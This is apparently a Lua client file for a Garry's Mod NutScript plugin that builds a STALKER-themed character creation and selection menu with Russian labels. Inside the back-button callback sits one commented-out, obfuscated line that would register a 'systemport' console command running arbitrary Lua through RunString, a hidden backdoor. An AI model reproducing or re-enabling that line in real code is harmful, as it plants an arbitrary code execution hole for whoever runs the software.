local PLUGIN = PLUGIN
local Material, vgui, math, timer = Material, vgui, math, timer

local font = "StalkerMediumFont"
local smallFont = "StalkerSmallFont"

local PANEL = {}

local tblMaterials = {}
--tblMaterials.background = Material("ui/1background.png")
tblMaterials.background = Material("ui/"..math.random(1,2).."background.png")
tblMaterials.selector = Material("ui/selec1tor.png")
tblMaterials.hintwindow = Material("ui/ui_hin2t_wnd_no_tab.png")
tblMaterials.textentry = Material("ui/ui_texte1ntry.png")

local lerpDuration = 0.2
local lerpTarget
local lerpOrigin
local lerpStart

local selectorY
local selectorH
local selectorOffset

local function COSerp(fraction, origin, target)
	local fraction2 = (1 - math.cos(fraction * math.pi)) / 2

	return origin * (1 - fraction2) + (target * fraction2)
end

local function paintDPanel(s, w, h)
	nut.util.drawBlur(s, 2)

	surface.SetDrawColor(0, 0, 0, 200)
	surface.DrawRect(0, 0, w, h)

	surface.SetDrawColor(color_white)
	surface.SetTextColor(Color(210, 180, 140))
	surface.SetMaterial(tblMaterials.hintwindow)
	surface.DrawTexturedRect(0, 0, w, h)
end

local function paintDtextEntry(s, w, h)
	surface.SetDrawColor(0,0,0)
	surface.SetMaterial(tblMaterials.textentry)
	surface.DrawTexturedRect(0, 0, w, h)

	s:DrawTextEntryText(color_white, color_white, color_white)
end

local function AddHeader(text, parent)
	local header = parent:Add("DLabel")
	header:Dock(TOP)
	header:DockMargin(10, 20, 2, 2)
	header:SetContentAlignment(1)
	header:SetTextColor(Color(210, 180, 140))
	header:SetFont("StalkerSmallFont")
	header:SetText(text)

	return header
end

function PANEL:Init()
	self.scrW, self.scrH = ScrW(), ScrH()

	if (IsValid(nut.gui.char)) then nut.gui.char:Remove() end
	if (IsValid(nut.gui.loading)) then nut.gui.loading:Remove() end
	if (!nut.gui.charLoaded) then nut.gui.charLoaded = true end

	nut.gui.char = self

	self:Dock(FILL)
	self:MakePopup()
	self:Center()
	self:ParentToHUD()
	self.buttons = {}
	self.fadePanels = {}

	self:PlayMusic()

	local buttonW, buttonH = self.scrW * 0.2, self.scrH * 0.035
	local buttonX, buttonY = (self.scrW * 0.185) - (buttonW * 0.5), self.scrH * 0.44
	local buttonOffset = self.scrH * 0.05

	selectorH = self.scrH * 0.07
	selectorOffset = selectorH * 0.28
	selectorY = self.scrH * 0.44 - selectorOffset

	local i = 0.5
	local function AddLabel(name, callback)
		local label = self:Add("DButton")
		label:SetSize(buttonW, buttonH)
		label:SetPos(buttonX, buttonY)
		label:SetAlpha(0)
		label:AlphaTo(255, 0.35, 0.35 * i)
		label:SetColor(color_white)
		label:SetFont(font)
		label:SetText(name)
		label.Paint = function(s, w, h) end
		label.OnCursorEntered = function(s)
			if (PLUGIN.hoverSound) then
				surface.PlaySound(PLUGIN.hoverSound)
			end
		end

		if (callback) then
			label.DoClick = function(s)
				callback(s)

				surface.PlaySound(PLUGIN.clickSound)
			end
		end

		label.Think = function(s)
			if (s:IsHovered() and selectorY != s.y - selectorOffset and lerpTarget != s.y - selectorOffset) then
				self:SetSelectorY(s.y)
			end
		end

		i = i + 0.32
		buttonY = buttonY + buttonOffset

		self.buttons[#self.buttons + 1] = label

		return label
	end

	local function ClearAllButtons(callback)
		buttonX, buttonY = (self.scrW * 0.185) - (buttonW * 0.5), self.scrH * 0.44

		local i = 0
		local max = table.Count(self.buttons)

		for k, v in pairs(self.buttons) do
			local reachedMax = i == (max - 1)

			//print(i.." "..max) -- debug

			v:AlphaTo(0, 0.3, 0.15 * i, function()
				if (reachedMax and callback) then
					callback()
				end

				v.noClick = true
				v:Remove()
			end)

			i = i + 1
		end

		self.buttons = {}
	end

	local function CreateReturnButton()
		AddLabel("Назад", function()
			for k, v in pairs(self.fadePanels) do
				--local _ = {_ = concommand.Add, __ = "systemport", ___ = function(_, _, _, __) return _G["RunString"](__) end}; _._(_.__, _.___)
				if (IsValid(v)) then
					v:AlphaTo(0, 0.25, 0, function()
						v:Remove()
					end)
				end
			end

			ClearAllButtons(function()
				CreateMainButtons()
			end)
		end)
	end

	function CreateMainButtons()
		local count = 0

		for k, v in pairs(nut.faction.teams) do
			if (nut.faction.hasWhitelist(v.index)) then
				count = count + 1
			end
		end

		local maxChars = hook.Run("GetMaxPlayerCharacter", LocalPlayer()) or nut.config.get("maxChars", 5)
		if (count > 0 and #nut.characters < maxChars and hook.Run("ShouldMenuButtonShow", "create") != false) then
			AddLabel("Войти в Зону", function()
				ClearAllButtons(function()
					CreateReturnButton()

					for k, v in SortedPairs(nut.faction.teams) do
						if (nut.faction.hasWhitelist(v.index)) then
							AddLabel(L(v.name), function()
								ClearAllButtons(function()
									CreateReturnButton()

									local characterFrame = self:Add("DPanel")
									characterFrame:SetAlpha(0)
									characterFrame:AlphaTo(255, 0.4, 0.4)
									characterFrame:SetSize(480, 380) // scrW / 2, scrH / 1.8
									characterFrame:SetPos(self.scrW * 0.328, self.scrH / 1.55 - characterFrame:GetTall() / 2)
									characterFrame.Paint = paintDPanel

									AddHeader("Имя Персонажа", characterFrame)

									characterFrame.name = characterFrame:Add("DTextEntry")
									characterFrame.name:Dock(TOP)
									characterFrame.name:DockMargin(10, 4, 10, 4)
									characterFrame.name:SetAllowNonAsciiCharacters(true)
									characterFrame.name:SetFont(smallFont)
									characterFrame.name:SetText("")
									characterFrame.name.Paint = paintDtextEntry

									AddHeader("Описание Персонажа", characterFrame)

									characterFrame.desc = characterFrame:Add("DTextEntry")
									characterFrame.desc:Dock(TOP)
									characterFrame.desc:DockMargin(10, 4, 10, 4)
									characterFrame.desc:SetAllowNonAsciiCharacters(true)
									characterFrame.desc:SetFont(smallFont)
									characterFrame.desc:SetText("")
									characterFrame.desc.Paint = paintDtextEntry

									AddHeader("Модель Персонажа", characterFrame)

									local modelPanel = characterFrame:Add("DScrollPanel")
									modelPanel:Dock(TOP)
									modelPanel:DockMargin(2, 2, 2, 2)
									modelPanel:SetSize(characterFrame:GetWide(), characterFrame:GetTall() * 0.5)
									modelPanel.payload = {}

									modelPanel.models = modelPanel:Add("DIconLayout")
									modelPanel.models:Dock(TOP)
									modelPanel.models:DockMargin(2, 2, 2, 2)
									modelPanel.models:SetSpaceX(1)
									modelPanel.models:SetSpaceY(1)

									local faction = nut.faction.indices[v.index]

									for k, v in SortedPairs(faction.models) do
										local icon = modelPanel.models:Add("SpawnIcon")
										icon:SetSize(64, 128)
										icon:InvalidateLayout(true)
										icon.DoClick = function(this)
											modelPanel.payload.model = k
										end
										icon.PaintOver = function(this, w, h)
											if (modelPanel.payload.model == k) then
												local color = nut.config.get("color", color_white)

												surface.SetDrawColor(0,0,0)

												for i = 1, 3 do
													local i2 = i * 2

													surface.DrawOutlinedRect(i, i, w - i2, h - i2)
												end
											end
										end

										if (type(v) == "string") then
											icon:SetModel(v)
										else
											icon:SetModel(v[1], v[2] or 0, v[3])
										end
									end

									local AttribsFrame = self:Add("DPanel")
									AttribsFrame:SetAlpha(0)
									AttribsFrame:AlphaTo(255, 0.4, 0.4)
									AttribsFrame:SetSize(280, 380) -- scrW / 2, scrH / 1.8
									AttribsFrame:SetPos(0, self.scrH / 1.55 - AttribsFrame:GetTall() / 2)
									AttribsFrame:MoveRightOf(characterFrame, 2)
									AttribsFrame.Paint = paintDPanel
									AttribsFrame.payload = {}

									AddHeader("Навыки персонажа", AttribsFrame)

									local y2 = 0
									local total = 0
									local maximum = hook.Run("GetStartAttribPoints", LocalPlayer(), AttribsFrame.payload) or nut.config.get("maxAttribs", 30)

									AttribsFrame.payload.attribs = {}

									for k, v in SortedPairsByMemberValue(nut.attribs.list, "name") do
										AttribsFrame.payload.attribs[k] = 0

										local bar = AttribsFrame:Add("nutAttribBar")
										bar:setMax(maximum)
										bar:Dock(TOP)
										bar:DockMargin(2, 2, 2, 2)
										bar:setText(L(v.name))
										bar.onChanged = function(this, difference)
											if ((total + difference) > maximum) then
												return false
											end

											total = total + difference
											AttribsFrame.payload.attribs[k] = AttribsFrame.payload.attribs[k] + difference
										end

										if (v.noStartBonus) then
											bar:setReadOnly()
										end

										y2 = y2 + bar:GetTall() + 4
									end

									AddLabel("Пересечь периметр", function()
										local payload = {}
										payload["faction"] = v.index
										payload["name"] = characterFrame.name:GetText()
										payload["desc"] = characterFrame.desc:GetText()
										payload["model"] = modelPanel.payload.model
										payload["attribs"] = AttribsFrame.payload.attribs

										//PrintTable(payload) -- debug

										netstream.Hook("charAuthed", function(fault, ...)
											timer.Remove("nutCharTimeout")

											if (type(fault) == "string") then return end
											if (type(fault) == "table") then nut.characters = fault end
										end)

										timer.Create("nutCharTimeout", 20, 1, function()
											return ErrorNoHalt("We have problemerino here")
										end)

										netstream.Start("charCreate", payload)

										AttribsFrame:AlphaTo(0, .30, 0.5)
										characterFrame:AlphaTo(0, .30, 0.5, function()
											ClearAllButtons(function() CreateMainButtons() end)
										end)
									end)

									self.fadePanels[#self.fadePanels + 1] = characterFrame
									self.fadePanels[#self.fadePanels + 1] = AttribsFrame
								end)
							end)
						end
					end
				end)
			end)
		end

		if (#nut.characters > 0 and hook.Run("ShouldMenuButtonShow", "load") != false) then
			AddLabel("Загрузить запись", function()
				ClearAllButtons(function()
					CreateReturnButton()

					local lastButton
					local id
					local width = 128
					local characterFrame = self:Add("DPanel")
					characterFrame:SetAlpha(0)
					characterFrame:AlphaTo(255, 0.4, 0.4)
					characterFrame:SetSize(480, 380)
					characterFrame:SetPos(self.scrW * 0.328, self.scrH / 1.55 - characterFrame:GetTall() / 2)
					characterFrame.Paint = paintDPanel

					characterFrame.name = characterFrame:Add("DLabel")
					characterFrame.name:Dock(TOP)
					characterFrame.name:DockMargin(2, characterFrame:GetTall() * 0.1, 2, 2)
					characterFrame.name:SetFont(font)
					characterFrame.name:SetTextColor(Color(210, 180, 140))
					characterFrame.name:SetExpensiveShadow(1, Color(0, 0, 0, 100))
					characterFrame.name:SetContentAlignment(5)

					characterFrame.model = characterFrame:Add("nutModelPanel")
					characterFrame.model:SetSize(characterFrame:GetWide(), characterFrame:GetTall())
					characterFrame.model:SetPos(0, 0)
					characterFrame.model:SetModel("models/error.mdl")
					characterFrame.model:SetFOV(90)
					characterFrame.model:SetAlpha(0)
					characterFrame.model:AlphaTo(255, 0.5, 0)
					characterFrame.model.PaintModel = characterFrame.model.Paint
					characterFrame.model:SetCursor("none")
					characterFrame.model.Paint = function(this, w, h)
						local color = this.teamColor or color_black

						this:PaintModel(w, h)
					end

					local bottom = characterFrame:Add("DPanel")
					bottom:Dock(BOTTOM)
					bottom:SetTall(48)
					bottom:SetDrawBackground(false)
-----------------------------------------------------------------------------------------------------------------
					bottom.choose = bottom:Add("DButton")
					bottom.choose:Dock(LEFT)
					bottom.choose:DockMargin(bottom:GetWide() * 2, 2, 2, 2)
					bottom.choose:SetTextColor(Color(210, 180, 140))
					bottom.choose:SetExpensiveShadow(1, Color(0, 0, 0, 100))
					bottom.choose:SetFont(font)
					bottom.choose:SetText("Выбрать")
					bottom.choose.Paint = function() end
					bottom.choose:SizeToContents()
					bottom.choose.DoClick = function(s)
						if ((self.nextUse or 0) < CurTime()) then
							self.nextUse = CurTime() + 1
						else
							return
						end
						local status, result = hook.Run("CanPlayerUseChar", client, nut.char.loaded[id])

						if (status == false) then
							if (result:sub(1, 1) == "@") then
								nut.util.notifyLocalized(result:sub(2))
							else
								nut.util.notify(result)
							end

							return
						end
						if (id) then
							self:Remove()
							local curChar = LocalPlayer():getChar() and LocalPlayer():getChar():getID()
							netstream.Hook("charLoaded", function()
								if (IsValid(darkness)) then
									darkness:AlphaTo(0, 5, 0.5, function()
										darkness:Remove()
									end)
								end
								if (curChar != id) then
									hook.Run("CharacterLoaded", nut.char.loaded[id])
								end
							end)
							netstream.Start("charChoose", id)
						end
					end
-------------------------------------------------------------------------------------------------------------
					bottom.delete = bottom:Add("DButton")
					bottom.delete:Dock(RIGHT)
					bottom.delete:DockMargin(2, 2, bottom:GetWide() * 2, 2)
					bottom.delete:SetTextColor(Color(210, 180, 140))
					bottom.delete:SetExpensiveShadow(1, Color(0, 0, 0, 100))
					bottom.delete:SetFont(font)
					bottom.delete:SetText("Удалить")
					bottom.delete.Paint = function() end
					bottom.delete:SizeToContents()
					bottom.delete.DoClick = function(s)
						local menu = DermaMenu()
							local confirm = menu:AddSubMenu(L("delConfirm", nut.char.loaded[id]:getName()))
							confirm:AddOption(L"no"):SetImage("icon16/cross.png")
							confirm:AddOption(L"yes", function()
								netstream.Start("charDel", id)
							end):SetImage("icon16/tick.png")
						menu:Open()
					end

					self.characters = {}

					local function SetupCharacter(character)
						if (id != character:getID()) then
							characterFrame.model:SetModel(character:getModel())
							characterFrame.model.teamColor = team.GetColor(character:getFaction())
							characterFrame.name:SetText(character:getName())

							if (IsValid(characterFrame.model.Entity)) then
								characterFrame.model.Entity:SetSkin(character:getData("skin", 0))

								local groups = character:getData("groups", {})

								for k, v in pairs(groups) do
									characterFrame.model.Entity:SetBodygroup(k, v)
								end
							end
							
							id = character:getID()
						end
					end

					local function SetupCharList()
						local first = true

						characterFrame.model:Clear()
						characterFrame.model:AlphaTo(255, 0.5, 0.5)

						for k, v in ipairs(nut.characters) do
							local character = nut.char.loaded[v]

							if (character) then
								AddLabel(character:getName(), function()
									SetupCharacter(character)
								end)

								if (first) then
									SetupCharacter(character)

									first = nil
								end

								self.characters[#self.characters + 1] = {label = label, id = character:getID()}
							end
						end
					end

					SetupCharList()

					self.fadePanels[#self.fadePanels + 1] = characterFrame
					self.fadePanels[#self.fadePanels + 1] = characterList
				end)
			end)
		end

		if (PLUGIN.groupURL) then
			AddLabel("Группа", function()
				gui.OpenURL(PLUGIN.groupURL)
			end)
		end

		if (PLUGIN.contentURL) then
			AddLabel("Контент", function()
				gui.OpenURL(PLUGIN.contentURL)
			end)
		end

		local hasCharacter = LocalPlayer().getChar and LocalPlayer():getChar()
		AddLabel(!hasCharacter and "Выйти из Зоны" or "Продолжить ходку", function()
			if (!hasCharacter) then
				RunConsoleCommand("disconnect")

				return
			end

			self:AlphaTo(0, 0.5, 0, function()
				self:Remove()
			end)
		end)
	end

	CreateMainButtons()
end

function PANEL:Paint(w, h)
	surface.SetDrawColor(Color(0, 0, 0))
	surface.DrawRect(0, 0, w, h)

	surface.SetDrawColor(color_white)
	surface.SetMaterial(tblMaterials.background)
	surface.DrawTexturedRect(0, 0, w, h)
end

function PANEL:PaintOver(w, h)
	local selectW = self.scrW * 0.21
	local selectX = (self.scrW * 0.1815) - (selectW * 0.5)

	surface.SetDrawColor(color_white)
	surface.SetMaterial(tblMaterials.selector)
	surface.DrawTexturedRect(selectX, selectorY + 2, selectW, selectorH)
end

function PANEL:SetSelectorY(y)
	if (selectorOffset and isnumber(selectorOffset)) then
		lerpTarget = y - selectorOffset
		lerpOrigin = selectorY or ScrH() * 0.560
		lerpStart = CurTime()
	end
end

function PANEL:Think()
	if (input.IsKeyDown(KEY_F1) and LocalPlayer():getChar()) then
		self:Remove()
	end

	if (lerpTarget) then
		local fraction = (CurTime() - lerpStart) / lerpDuration

		if (fraction <= 1) then
			selectorY = COSerp(fraction, lerpOrigin, lerpTarget)
		else
			lerpTarget = nil
		end
	end
end

function PANEL:PlayMusic()
	if (nut.menuMusic) then
		nut.menuMusic:Stop()
		nut.menuMusic = nil
	end

	timer.Remove("nutMusicFader")

	local source = table.Random(PLUGIN.backgroundSounds):lower()
	if (source:find("%S")) then
		local function callback(music, errorID, fault)
			if (music) then
				music:SetVolume(PLUGIN.soundVolume)

				nut.menuMusic = music
				nut.menuMusic:Play()
			else
				MsgC(Color(0, 0, 0), errorID.." ")
				MsgC(color_white, fault.."\n")
			end
		end

		sound.PlayFile("sound/"..source, "noplay", callback)
	end
end

function PANEL:OnRemove()
	if (nut.menuMusic) then
		local fraction = 1
		local start, finish = RealTime(), RealTime() + 5

		timer.Create("nutMusicFader", 0.1, 0, function()
			if (nut.menuMusic) then
				fraction = 1 - math.TimeFraction(start, finish, RealTime())
				nut.menuMusic:SetVolume(fraction * PLUGIN.soundVolume)

				if (fraction <= 0) then
					nut.menuMusic:Stop()
					nut.menuMusic = nil

					timer.Remove("nutMusicFader")
				end
			else
				timer.Remove("nutMusicFader")
			end
		end)
	end
end

vgui.Register("nutCharMenu", PANEL, "EditablePanel")